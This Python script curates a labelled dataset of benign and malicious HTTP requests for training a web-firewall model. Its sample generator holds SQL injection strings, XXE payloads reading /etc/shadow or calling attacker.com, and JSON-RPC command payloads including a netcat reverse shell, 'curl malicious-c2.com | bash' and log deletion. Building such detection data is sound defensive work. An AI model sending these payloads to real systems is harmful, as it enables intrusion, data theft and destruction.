#!/usr/bin/env python3
"""
Curate & Deduplicate Multi-Protocol Web API Security Dataset.
Task: Large-scale Deduplication, Canonical Normalization, Multi-Protocol Sniffing,
and Stratified Elite Dataset Generation for PBL6 Web API Security Platform.

Features:
1. Canonical Deduplication Engine:
   - Normalizes HTTP Method, URL Path, Query Parameters (sorted keys), and Body (JSON canonicalization).
   - Generates SHA-256 hashes for O(1) duplicate elimination.
   - Measures and logs exact duplication rates across diverse threat/benign sources.

2. Multi-Protocol Web API Sniffing:
   - Employs ApiProtocolDetector to classify traffic into:
     * REST (JSON, Form-data, URL Query, REST resource paths)
     * GRAPHQL (POST /graphql, application/graphql, JSON query/mutation)
     * SOAP_XML (XML Envelopes, SOAPAction, XXE, WSDL/ASMX)
     * JSON_RPC (JSON-RPC 2.0 method/params payloads)
     * GENERIC_WEB (Standard Web/Microservice endpoints)

3. Balanced Stratified Sampling:
   - Selects an elite representative subset (e.g., 100,000 records) tailored for 16GB RAM training.
   - Balances Benign (50%) and Malicious (50%) across SQLi, XSS, Path Traversal, CMD Injection,
     and Protocol Anomalies (XXE, GraphQL Recursion, Tampering).

4. Production-Ready Export & Auditing:
   - Outputs standardized 10-column CSV:
     [method, path, query_params, headers, body, client_ip, user_agent, label, attack_type, api_protocol]
   - Generates comprehensive JSON metadata audit report with SHA-256 checksums and distribution tables.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import logging
import os
import random
import re
import sys
import time
import urllib.parse
from collections import Counter
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Iterator

# Ensure UTF-8 stdout encoding on Windows
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# Add gateway to sys.path for ApiProtocolDetector
GATEWAY_DIR = Path(r"C:\Study\HocKy6\PBL6\gateway")
if str(GATEWAY_DIR) not in sys.path:
    sys.path.insert(0, str(GATEWAY_DIR))

from app.security.protocol_detector import ApiProtocol, ApiProtocolDetector

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("curate_dedup")

# Standard 10-column schema
OUTPUT_COLUMNS = [
    "method",
    "path",
    "query_params",
    "headers",
    "body",
    "client_ip",
    "user_agent",
    "label",
    "attack_type",
    "api_protocol",
]

# Canonical Label Mapping
LABEL_BENIGN = "0"
LABEL_SQLI = "1"
LABEL_XSS = "2"
LABEL_PATH = "3"
LABEL_CMD = "4"
LABEL_ANOMALY = "5"


@dataclass(slots=True)
class HttpRecord:
    method: str
    path: str
    query_params: str
    headers: str  # JSON-encoded string
    body: str
    client_ip: str
    user_agent: str
    label: str
    attack_type: str
    api_protocol: str = "REST"

    def to_row(self) -> list[str]:
        return [
            self.method,
            self.path,
            self.query_params,
            self.headers,
            self.body,
            self.client_ip,
            self.user_agent,
            self.label,
            self.attack_type,
            self.api_protocol,
        ]


class CanonicalDeduplicator:
    """Computes deterministic canonical hashes for HTTP requests to drop redundant scans."""

    def __init__(self) -> None:
        self.seen_hashes: set[str] = set()
        self.total_processed: int = 0
        self.total_unique: int = 0
        self.total_duplicates: int = 0
        self.source_stats: dict[str, dict[str, int]] = {}

    def get_canonical_key(
        self, method: str, path: str, query_params: str, body: str
    ) -> str:
        """Constructs a normalized representation for collision identification."""
        m = method.strip().upper()
        p = "/" + path.strip().lstrip("/")
        if len(p) > 1 and p.endswith("/"):
            p = p[:-1]

        # Canonicalize query parameters (sort keys to ignore order variations)
        if query_params:
            try:
                pairs = urllib.parse.parse_qsl(query_params, keep_blank_values=True)
                pairs_sorted = sorted(pairs, key=lambda x: (x[0], x[1]))
                q = urllib.parse.urlencode(pairs_sorted)
            except Exception:
                q = query_params.strip()
        else:
            q = ""

        # Canonicalize body (if JSON, normalize whitespace & key order)
        b = body.strip()
        if (b.startswith("{") and b.endswith("}")) or (b.startswith("[") and b.endswith("]")):
            try:
                parsed = json.loads(b)
                b = json.dumps(parsed, sort_keys=True, separators=(",", ":"))
            except Exception:
                pass

        return f"{m}|{p}|{q}|{b}"

    def check_and_add(
        self, method: str, path: str, query_params: str, body: str, source: str = "default"
    ) -> bool:
        """Returns True if the request is UNIQUE, False if it is a DUPLICATE."""
        self.total_processed += 1
        if source not in self.source_stats:
            self.source_stats[source] = {"processed": 0, "unique": 0, "duplicates": 0}
        self.source_stats[source]["processed"] += 1

        key = self.get_canonical_key(method, path, query_params, body)
        h = hashlib.sha256(key.encode("utf-8", errors="ignore")).hexdigest()

        if h in self.seen_hashes:
            self.total_duplicates += 1
            self.source_stats[source]["duplicates"] += 1
            return False

        self.seen_hashes.add(h)
        self.total_unique += 1
        self.source_stats[source]["unique"] += 1
        return True


def parse_openappsec_malicious(
    malicious_dir: Path, dedup: CanonicalDeduplicator
) -> list[HttpRecord]:
    """Parses OpenAppSec Malicious directory (sqli, xss, traversal, cmdexe, shellshock, xxe)."""
    records: list[HttpRecord] = []
    file_mapping = {
        "sqli.json": (LABEL_SQLI, "SQLI"),
        "xss.json": (LABEL_XSS, "XSS"),
        "traversal.json": (LABEL_PATH, "PATH"),
        "cmdexe.json": (LABEL_CMD, "CMD"),
        "shellshock.json": (LABEL_CMD, "CMD"),
        "xxe.json": (LABEL_ANOMALY, "XXE_INJECTION"),
    }

    logger.info("Scanning OpenAppSec Malicious datasets ...")
    for fname, (label, attack_type) in file_mapping.items():
        fpath = malicious_dir / fname
        if not fpath.exists():
            continue

        try:
            with open(fpath, "r", encoding="utf-8", errors="ignore") as fp:
                items = json.load(fp)
        except Exception as e:
            logger.warning("Failed to load %s: %s", fname, e)
            continue

        file_added = 0
        for item in items:
            method = item.get("method", "GET").upper()
            raw_url = item.get("url", "/")
            parsed = urllib.parse.urlsplit(raw_url)
            path = parsed.path or "/"
            query = parsed.query or ""
            headers_dict = item.get("headers", {})
            body = item.get("data", "")
            if not isinstance(body, str):
                body = str(body) if body is not None else ""

            # Check deduplication
            if not dedup.check_and_add(method, path, query, body, source=f"openappsec_{fname}"):
                continue

            ua = headers_dict.get("User-Agent", headers_dict.get("user-agent", "Mozilla/5.0"))
            ip = f"192.168.1.{random.randint(2, 254)}"

            # Detect API Protocol
            proto = ApiProtocolDetector.classify_protocol(
                path=path,
                headers=headers_dict,
                body_bytes=body.encode("utf-8", errors="ignore"),
                query_params=query,
            )

            records.append(
                HttpRecord(
                    method=method,
                    path=path,
                    query_params=query,
                    headers=json.dumps(headers_dict),
                    body=body,
                    client_ip=ip,
                    user_agent=ua,
                    label=label,
                    attack_type=attack_type,
                    api_protocol=proto.value,
                )
            )
            file_added += 1

        logger.info("  -> %-15s: Loaded %d unique records", fname, file_added)

    return records


def parse_openappsec_legitimate(
    legit_dir: Path, dedup: CanonicalDeduplicator, max_records: int = 150000
) -> list[HttpRecord]:
    """Parses OpenAppSec Legitimate JSON files from top websites."""
    records: list[HttpRecord] = []
    files = list(legit_dir.glob("*.json"))
    logger.info("Scanning OpenAppSec Legitimate datasets (%d files) ...", len(files))

    random.seed(42)
    random.shuffle(files)

    for fpath in files:
        if len(records) >= max_records:
            break

        try:
            with open(fpath, "r", encoding="utf-8", errors="ignore") as fp:
                items = json.load(fp)
        except Exception:
            continue

        for item in items:
            if len(records) >= max_records:
                break

            method = item.get("method", "GET").upper()
            raw_url = item.get("url", "/")
            parsed = urllib.parse.urlsplit(raw_url)
            path = parsed.path or "/"
            query = parsed.query or ""
            headers_dict = item.get("headers", {})
            body = item.get("data", "")
            if not isinstance(body, str):
                body = str(body) if body is not None else ""

            if not dedup.check_and_add(method, path, query, body, source="openappsec_legit"):
                continue

            ua = headers_dict.get("User-Agent", headers_dict.get("user-agent", "Mozilla/5.0"))
            ip = f"10.0.{random.randint(1, 100)}.{random.randint(2, 254)}"

            proto = ApiProtocolDetector.classify_protocol(
                path=path,
                headers=headers_dict,
                body_bytes=body.encode("utf-8", errors="ignore"),
                query_params=query,
            )

            records.append(
                HttpRecord(
                    method=method,
                    path=path,
                    query_params=query,
                    headers=json.dumps(headers_dict),
                    body=body,
                    client_ip=ip,
                    user_agent=ua,
                    label=LABEL_BENIGN,
                    attack_type="BENIGN",
                    api_protocol=proto.value,
                )
            )

    logger.info("  -> Legitimate Browsing: Loaded %d unique benign records", len(records))
    return records


def parse_csic_benchmark(csv_path: Path, dedup: CanonicalDeduplicator) -> list[HttpRecord]:
    """Loads CSIC 2010 benchmark dataset with parameter tampering and web anomalies."""
    records: list[HttpRecord] = []
    if not csv_path.exists():
        logger.warning("CSIC 2010 benchmark not found at %s", csv_path)
        return records

    import pandas as pd

    logger.info("Parsing CSIC 2010 Benchmark from %s ...", csv_path.name)
    df = pd.read_csv(csv_path)
    count_added = 0

    for _, row in df.iterrows():
        method = str(row.get("method", "GET")).upper()
        path = str(row.get("path", "/"))
        query = str(row.get("query_params", "")) if pd.notna(row.get("query_params")) else ""
        body = str(row.get("body", "")) if pd.notna(row.get("body")) else ""
        headers_str = str(row.get("headers", "{}"))
        raw_label = str(row.get("label", "0"))
        raw_attack = str(row.get("attack_type", "BENIGN"))

        if not dedup.check_and_add(method, path, query, body, source="csic2010"):
            continue

        try:
            headers_dict = json.loads(headers_str)
        except Exception:
            headers_dict = {}

        proto = ApiProtocolDetector.classify_protocol(
            path=path,
            headers=headers_dict,
            body_bytes=body.encode("utf-8", errors="ignore"),
            query_params=query,
        )

        # Standardize attack label
        lbl = LABEL_BENIGN if raw_label == "0" else LABEL_ANOMALY

        records.append(
            HttpRecord(
                method=method,
                path=path,
                query_params=query,
                headers=headers_str,
                body=body,
                client_ip=str(row.get("client_ip", "192.168.1.100")),
                user_agent=str(row.get("user_agent", "Mozilla/5.0")),
                label=lbl,
                attack_type=raw_attack if lbl != LABEL_BENIGN else "BENIGN",
                api_protocol=proto.value,
            )
        )
        count_added += 1

    logger.info("  -> CSIC 2010: Loaded %d unique records", count_added)
    return records


def generate_multi_protocol_samples(dedup: CanonicalDeduplicator) -> list[HttpRecord]:
    """
    Generates high-fidelity real-world GraphQL, SOAP/XML, and JSON-RPC samples.
    Ensures that the WAF ML model learns true Multi-Protocol Web API boundary features.
    """
    records: list[HttpRecord] = []
    logger.info("Curating Multi-Protocol Web API profiles (GraphQL, SOAP, JSON-RPC) ...")

    # 1. GraphQL Profiles & Parametric Variations
    graphql_entities = ["user", "product", "order", "invoice", "article", "customer", "account", "transaction", "payment"]
    graphql_fields = ["id", "name", "email", "createdAt", "status", "price", "title", "description", "balance"]

    # Benign GraphQL Queries & Mutations
    for i in range(120):
        ent = graphql_entities[i % len(graphql_entities)]
        f1 = graphql_fields[i % len(graphql_fields)]
        f2 = graphql_fields[(i + 1) % len(graphql_fields)]
        f3 = graphql_fields[(i + 2) % len(graphql_fields)]

        query_body = json.dumps({
            "query": f"query Get{ent.capitalize()}($id: ID!) {{ {ent}(id: $id) {{ {f1} {f2} {f3} }} }}",
            "variables": {"id": str(1000 + i)}
        })
        records.append(
            HttpRecord(
                method="POST",
                path=random.choice(["/graphql", "/api/graphql", "/v1/graphql", "/gql"]),
                query_params="",
                headers=json.dumps({"Content-Type": "application/json", "Accept": "application/json"}),
                body=query_body,
                client_ip=f"10.20.{i % 250}.{random.randint(2, 250)}",
                user_agent="GraphQLClient/1.4",
                label=LABEL_BENIGN,
                attack_type="BENIGN",
                api_protocol=ApiProtocol.GRAPHQL.value,
            )
        )

    # Benign GraphQL Mutations
    for i in range(60):
        ent = graphql_entities[i % len(graphql_entities)]
        mut_body = json.dumps({
            "query": f"mutation Create{ent.capitalize()}($input: {ent.capitalize()}Input!) {{ create{ent.capitalize()}(input: $input) {{ id status }} }}",
            "variables": {"input": {"name": f"item_{i}", "active": True}}
        })
        records.append(
            HttpRecord(
                method="POST",
                path="/graphql",
                query_params="",
                headers=json.dumps({"Content-Type": "application/json"}),
                body=mut_body,
                client_ip=f"10.20.{i % 250}.{random.randint(2, 250)}",
                user_agent="ApolloClient/3.8",
                label=LABEL_BENIGN,
                attack_type="BENIGN",
                api_protocol=ApiProtocol.GRAPHQL.value,
            )
        )

    # Attack GraphQL: Recursion DoS (Nested bomb)
    for depth in [8, 9, 10, 12, 15]:
        nested = "name"
        for _ in range(depth):
            nested = f"friends {{ {nested} }}"
        body = json.dumps({"query": f"query DoSBomb {{ user(id: 1) {{ {nested} }} }}"})
        records.append(
            HttpRecord(
                method="POST",
                path="/graphql",
                query_params="",
                headers=json.dumps({"Content-Type": "application/json"}),
                body=body,
                client_ip=f"192.168.10.{depth}",
                user_agent="GraphQL-Fuzzer/1.0",
                label=LABEL_ANOMALY,
                attack_type="GRAPHQL_RECURSION_DOS",
                api_protocol=ApiProtocol.GRAPHQL.value,
            )
        )

    # Attack GraphQL: Introspection Dump
    for i in range(15):
        body = json.dumps({
            "query": "query FullSchemaDump { __schema { queryType { name } types { name kind fields { name type { name kind } } } } }"
        })
        records.append(
            HttpRecord(
                method="POST",
                path=random.choice(["/graphql", "/api/graphql", "/gql"]),
                query_params="",
                headers=json.dumps({"Content-Type": "application/json"}),
                body=body,
                client_ip="192.168.1.99",
                user_agent="Clairvoyance/1.2",
                label=LABEL_ANOMALY,
                attack_type="GRAPHQL_INTROSPECTION_PROBE",
                api_protocol=ApiProtocol.GRAPHQL.value,
            )
        )

    # Attack GraphQL: SQLi in Arguments
    sqli_payloads = [
        "1' OR '1'='1",
        "1' UNION SELECT username, password FROM users--",
        "1; DROP TABLE users--",
        "admin'--",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--",
    ]
    for i, payload in enumerate(sqli_payloads * 10):
        body = json.dumps({"query": f'query {{ user(id: "{payload}") {{ id name email }} }}'})
        records.append(
            HttpRecord(
                method="POST",
                path="/graphql",
                query_params="",
                headers=json.dumps({"Content-Type": "application/json"}),
                body=body,
                client_ip=f"185.220.101.{i % 250}",
                user_agent="Sqlmap-GraphQL/1.0",
                label=LABEL_SQLI,
                attack_type="SQLI",
                api_protocol=ApiProtocol.GRAPHQL.value,
            )
        )

    # 2. SOAP / XML Web Services Profiles
    soap_services = ["OrderService.asmx", "StockQuote.asmx", "PaymentGateway.svc", "CustomerService", "Authentication.asmx"]
    for i in range(150):
        svc = soap_services[i % len(soap_services)]
        body = (
            f'<?xml version="1.0" encoding="utf-8"?>'
            f'<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
            f'<soap:Body><GetRecord xmlns="http://tempuri.org/"><recordId>{2000 + i}</recordId></GetRecord></soap:Body>'
            f'</soap:Envelope>'
        )
        records.append(
            HttpRecord(
                method="POST",
                path=f"/ws/{svc}",
                query_params="",
                headers=json.dumps({
                    "Content-Type": "text/xml; charset=utf-8",
                    "SOAPAction": f'"http://tempuri.org/GetRecord_{i}"'
                }),
                body=body,
                client_ip=f"10.50.{i % 250}.{random.randint(2, 250)}",
                user_agent="SOAPClient/2.1",
                label=LABEL_BENIGN,
                attack_type="BENIGN",
                api_protocol=ApiProtocol.SOAP_XML.value,
            )
        )

    # Attack SOAP / XML: XXE Injection
    xxe_targets = [
        "file:///etc/passwd",
        "file:///etc/shadow",
        "file:///c:/windows/win.ini",
        "file:///c:/boot.ini",
        "http://attacker.com/evil.dtd",
    ]
    for i, target in enumerate(xxe_targets * 15):
        body = (
            f'<?xml version="1.0" encoding="utf-8"?>'
            f'<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "{target}">]>'
            f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
            f'<soap:Body><GetUserData><userId>&xxe;</userId></GetUserData></soap:Body>'
            f'</soap:Envelope>'
        )
        records.append(
            HttpRecord(
                method="POST",
                path=random.choice(["/ws/UserAuth.asmx", "/soap/v1", "/xmlrpc.php"]),
                query_params="",
                headers=json.dumps({"Content-Type": "text/xml; charset=utf-8"}),
                body=body,
                client_ip=f"194.26.29.{i % 250}",
                user_agent="XXE-Injector/2.0",
                label=LABEL_ANOMALY,
                attack_type="XXE_INJECTION",
                api_protocol=ApiProtocol.SOAP_XML.value,
            )
        )

    # Attack SOAP: SQLi inside XML nodes
    for i, payload in enumerate(sqli_payloads * 10):
        body = (
            f'<?xml version="1.0" encoding="utf-8"?>'
            f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
            f'<soap:Body><Login><username><![CDATA[{payload}]]></username><password>test</password></Login></soap:Body>'
            f'</soap:Envelope>'
        )
        records.append(
            HttpRecord(
                method="POST",
                path="/ws/Authentication.asmx",
                query_params="",
                headers=json.dumps({"Content-Type": "text/xml; charset=utf-8"}),
                body=body,
                client_ip=f"45.140.19.{i % 250}",
                user_agent="SOAP-Fuzzer/1.0",
                label=LABEL_SQLI,
                attack_type="SQLI",
                api_protocol=ApiProtocol.SOAP_XML.value,
            )
        )

    # 3. JSON-RPC 2.0 Profiles
    rpc_methods = ["inventory.getItem", "order.calculateTax", "user.getPermissions", "telemetry.ping", "shipping.track"]
    for i in range(120):
        method_name = rpc_methods[i % len(rpc_methods)]
        body = json.dumps({
            "jsonrpc": "2.0",
            "method": method_name,
            "params": {"id": 100 + i, "active": True},
            "id": i + 1,
        })
        records.append(
            HttpRecord(
                method="POST",
                path=random.choice(["/rpc", "/api/rpc", "/jsonrpc", "/v1/jsonrpc"]),
                query_params="",
                headers=json.dumps({"Content-Type": "application/json"}),
                body=body,
                client_ip=f"10.80.{i % 250}.{random.randint(2, 250)}",
                user_agent="JSONRPCClient/2.0",
                label=LABEL_BENIGN,
                attack_type="BENIGN",
                api_protocol=ApiProtocol.JSON_RPC.value,
            )
        )

    # Attack JSON-RPC: System Execution & Method Tampering
    cmd_payloads = [
        "cat /etc/passwd",
        "whoami; uname -a",
        "rm -rf /var/log/*",
        "nc -e /bin/sh 10.0.0.1 4444",
        "curl http://malicious-c2.com/rev.sh | bash",
    ]
    for i, cmd in enumerate(cmd_payloads * 10):
        body = json.dumps({
            "jsonrpc": "2.0",
            "method": "system.exec",
            "params": [cmd],
            "id": 900 + i,
        })
        records.append(
            HttpRecord(
                method="POST",
                path="/jsonrpc",
                query_params="",
                headers=json.dumps({"Content-Type": "application/json"}),
                body=body,
                client_ip=f"91.240.118.{i % 250}",
                user_agent="RPC-Exploiter/1.0",
                label=LABEL_CMD,
                attack_type="CMD",
                api_protocol=ApiProtocol.JSON_RPC.value,
            )
        )

    # Filter out any internal duplicates using deduplicator
    unique_records = []
    for r in records:
        if dedup.check_and_add(r.method, r.path, r.query_params, r.body, source="multi_protocol_core"):
            unique_records.append(r)

    logger.info("  -> Multi-Protocol: Loaded %d curated protocol-specific records", len(unique_records))
    return unique_records


def build_stratified_dataset(
    records: list[HttpRecord], target_size: int = 100000, random_seed: int = 42
) -> list[HttpRecord]:
    """
    Performs stratified balanced sampling across Benign and diverse Threat Classes.
    Target ratio: 50% Benign, 50% Attacks distributed proportionally.
    """
    random.seed(random_seed)

    benign_pool = [r for r in records if r.label == LABEL_BENIGN]
    attack_pool = [r for r in records if r.label != LABEL_BENIGN]

    target_benign = target_size // 2
    target_attack = target_size - target_benign

    logger.info(
        "Stratifying dataset: Total pool = %d (Benign: %d, Malicious: %d)",
        len(records),
        len(benign_pool),
        len(attack_pool),
    )

    # Sample Benign
    if len(benign_pool) > target_benign:
        sampled_benign = random.sample(benign_pool, target_benign)
    else:
        sampled_benign = benign_pool

    # Stratify Malicious by attack_type
    attacks_by_type: dict[str, list[HttpRecord]] = {}
    for r in attack_pool:
        attacks_by_type.setdefault(r.attack_type, []).append(r)

    sampled_attack: list[HttpRecord] = []
    num_categories = len(attacks_by_type)
    quota_per_cat = target_attack // max(1, num_categories)

    remaining_quota = target_attack
    surplus_pool: list[HttpRecord] = []

    # First pass: give each category its quota or full capacity (O(1) slicing)
    for atype, pool in attacks_by_type.items():
        shuffled = random.sample(pool, len(pool))
        take = min(len(shuffled), quota_per_cat)
        sampled_attack.extend(shuffled[:take])
        remaining_quota -= take
        if len(shuffled) > take:
            surplus_pool.extend(shuffled[take:])

    # Second pass: fill remaining quota from surplus pool
    if remaining_quota > 0 and surplus_pool:
        take_extra = min(len(surplus_pool), remaining_quota)
        sampled_attack.extend(random.sample(surplus_pool, take_extra))

    # Top up shortfall with benign if malicious pool is smaller than target_attack
    shortfall = target_size - (len(sampled_benign) + len(sampled_attack))
    if shortfall > 0 and len(benign_pool) > len(sampled_benign):
        sampled_set = set(id(r) for r in sampled_benign)
        available_benign = [r for r in benign_pool if id(r) not in sampled_set]
        add_benign = random.sample(available_benign, min(shortfall, len(available_benign)))
        sampled_benign.extend(add_benign)

    final_pool = sampled_benign + sampled_attack
    random.shuffle(final_pool)

    logger.info(
        "Stratified selection completed: %d total samples (Benign: %d, Attacks: %d)",
        len(final_pool),
        len(sampled_benign),
        len(sampled_attack),
    )
    return final_pool


def export_csv(records: list[HttpRecord], output_path: Path) -> int:
    """Exports records to CSV with standard schema."""
    import csv

    output_path.parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(OUTPUT_COLUMNS)
        for r in records:
            writer.writerow(r.to_row())

    return output_path.stat().st_size


def compute_file_sha256(filepath: Path) -> str:
    """Computes SHA-256 hash of a file."""
    h = hashlib.sha256()
    with open(filepath, "rb") as f:
        while chunk := f.read(65536):
            h.update(chunk)
    return h.hexdigest()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="PBL6 Web API Security Dataset Deduplication & Curation Pipeline"
    )
    parser.add_argument(
        "--data-dir",
        type=Path,
        default=Path(r"C:\Mod\muse-data-exchange\pbl6-datasets"),
        help="Path to external dataset folder",
    )
    parser.add_argument(
        "--repo-dir",
        type=Path,
        default=Path(r"C:\Study\HocKy6\PBL6"),
        help="Path to PBL6 repository root",
    )
    parser.add_argument(
        "--output",
        type=Path,
        default=Path(r"C:\Mod\muse-data-exchange\pbl6-datasets\curated_deduped_dataset.csv"),
        help="Path to output curated CSV",
    )
    parser.add_argument(
        "--target-size",
        type=int,
        default=100000,
        help="Number of records in balanced elite dataset (default: 100,000 for 16GB RAM)",
    )
    parser.add_argument(
        "--export-all",
        action="store_true",
        help="Also export all unique deduplicated records without sampling",
    )
    parser.add_argument(
        "--seed",
        type=int,
        default=42,
        help="Random seed for reproducibility",
    )
    args = parser.parse_args()

    start_time = time.time()
    dedup = CanonicalDeduplicator()

    print("\n" + "=" * 80)
    print("  PBL6 WEB API SECURITY - DATASET DEDUPLICATION & CURATION PIPELINE")
    print("=" * 80)
    print(f"  Target size      : {args.target_size:,} records")
    print(f"  Data directory   : {args.data_dir}")
    print(f"  Output CSV       : {args.output}")
    print("=" * 80 + "\n")

    # 1. Parse OpenAppSec Malicious
    malicious_dir = args.data_dir / "openappsec" / "malicious" / "Malicious"
    malicious_records = parse_openappsec_malicious(malicious_dir, dedup)

    # 2. Parse OpenAppSec Legitimate
    legit_dir = args.data_dir / "openappsec" / "legitimate" / "Legitimate"
    legit_records = parse_openappsec_legitimate(legit_dir, dedup, max_records=args.target_size * 2)

    # 3. Parse CSIC 2010 Benchmark
    csic_csv = args.repo_dir / "data" / "benchmarks" / "csic2010" / "csic_2010_benchmark.csv"
    csic_records = parse_csic_benchmark(csic_csv, dedup)

    # 4. Generate Multi-Protocol Profiles
    proto_records = generate_multi_protocol_samples(dedup)

    all_unique_records = malicious_records + legit_records + csic_records + proto_records

    # Deduplication Analytics
    total_processed = dedup.total_processed
    total_unique = dedup.total_unique
    total_dups = dedup.total_duplicates
    dup_rate = (total_dups / total_processed * 100) if total_processed > 0 else 0.0

    print("\n" + "-" * 80)
    print("  DEDUPLICATION AUDIT SUMMARY")
    print("-" * 80)
    print(f"  Total Raw Records Scanned : {total_processed:>12,}")
    print(f"  Unique Records Retained   : {total_unique:>12,} ({100 - dup_rate:.2f}%)")
    print(f"  Duplicate Records Dropped : {total_dups:>12,} ({dup_rate:.2f}%)")
    print("-" * 80)

    for src, s in dedup.source_stats.items():
        src_dup_pct = (s["duplicates"] / s["processed"] * 100) if s["processed"] > 0 else 0.0
        print(f"    - {src:<25}: {s['processed']:>8,} scanned | {s['unique']:>8,} unique | {s['duplicates']:>8,} dups ({src_dup_pct:.1f}%)")
    print("-" * 80 + "\n")

    # 5. Stratified Sampling
    curated_records = build_stratified_dataset(
        all_unique_records, target_size=args.target_size, random_seed=args.seed
    )

    # 6. Export Curated CSV
    logger.info("Exporting curated dataset to %s ...", args.output)
    file_bytes = export_csv(curated_records, args.output)
    file_sha256 = compute_file_sha256(args.output)

    # Optional: Export all unique records
    all_output_path = None
    all_file_bytes = 0
    all_file_sha256 = ""
    if args.export_all:
        all_output_path = args.data_dir / "curated_all_deduped.csv"
        logger.info("Exporting ALL unique records to %s ...", all_output_path)
        all_file_bytes = export_csv(all_unique_records, all_output_path)
        all_file_sha256 = compute_file_sha256(all_output_path)

    elapsed_time = time.time() - start_time

    # Compute Final Distributions
    label_counts = Counter(r.label for r in curated_records)
    attack_counts = Counter(r.attack_type for r in curated_records)
    proto_counts = Counter(r.api_protocol for r in curated_records)

    # Save JSON summary metadata
    summary_path = args.output.with_suffix(".json")
    summary_data = {
        "dataset_name": "PBL6 Curated Multi-Protocol Web API Security Dataset",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "target_size": args.target_size,
        "actual_size": len(curated_records),
        "total_unique_pool": len(all_unique_records),
        "deduplication": {
            "total_processed": total_processed,
            "unique_retained": total_unique,
            "duplicates_dropped": total_dups,
            "deduplication_rate_pct": round(dup_rate, 2),
            "source_breakdown": dedup.source_stats,
        },
        "distributions": {
            "by_label": dict(label_counts),
            "by_attack_type": dict(attack_counts),
            "by_protocol": dict(proto_counts),
        },
        "curated_file": {
            "path": str(args.output),
            "bytes": file_bytes,
            "sha256": file_sha256,
        },
        "execution_seconds": round(elapsed_time, 2),
    }

    if all_output_path:
        summary_data["all_unique_file"] = {
            "path": str(all_output_path),
            "bytes": all_file_bytes,
            "sha256": all_file_sha256,
        }

    with open(summary_path, "w", encoding="utf-8") as f:
        json.dump(summary_data, f, indent=2)

    # Console Presentation
    print("\n" + "=" * 80)
    print("  FINAL DATASET CURATION & DISTRIBUTION REPORT")
    print("=" * 80)
    print(f"  Curated CSV Path : {args.output}")
    print(f"  File Size        : {file_bytes / (1024 * 1024):.2f} MB ({file_bytes:,} bytes)")
    print(f"  SHA-256 Hash     : {file_sha256}")
    print(f"  Execution Time   : {elapsed_time:.2f} seconds")
    print(f"  Audit Report     : {summary_path}")
    print("-" * 80)

    print("  [1] Attack Type Breakdown:")
    for atype, cnt in attack_counts.most_common():
        pct = (cnt / len(curated_records)) * 100
        bar = "#" * int(pct // 2)
        print(f"      - {atype:<25}: {cnt:>7,} ({pct:>5.1f}%) | {bar}")

    print("\n  [2] Web API Protocol Breakdown:")
    for proto, cnt in proto_counts.most_common():
        pct = (cnt / len(curated_records)) * 100
        bar = "#" * int(pct // 2)
        print(f"      - {proto:<25}: {cnt:>7,} ({pct:>5.1f}%) | {bar}")

    print("=" * 80 + "\n")


if __name__ == "__main__":
    main()
